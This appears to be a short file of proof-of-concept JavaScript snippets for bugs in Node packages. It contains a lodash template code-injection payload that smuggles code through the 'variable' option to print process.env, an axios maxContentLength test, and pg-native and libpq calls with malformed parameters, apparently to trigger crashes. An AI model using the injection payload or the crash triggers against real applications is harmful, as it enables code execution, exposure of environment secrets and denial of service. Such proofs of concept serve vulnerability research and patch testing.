const _ = require('lodash');

_.template('', { variable: '){console.log(process.env)}; with(obj' })()

require('axios').get(
    'https://upload.wikimedia.org/wikipedia/commons/f/fe/A_Different_Slant_on_Carina.jpg',
    { maxContentLength: 2000 }
  )
    .then(d => console.log('done'))
    .catch(e => console.log(e.toString()))


//pg-native -> poc.js

let Client = require('pg-native') 
let client = new Client(); 
client.connectSync(); 
client.query('some str', 1, function() {});

//libpq -> poc.js

var Libpq = require('libpq') 
const pq = new Libpq(); 
pq.sendQueryParams("some str", 1) 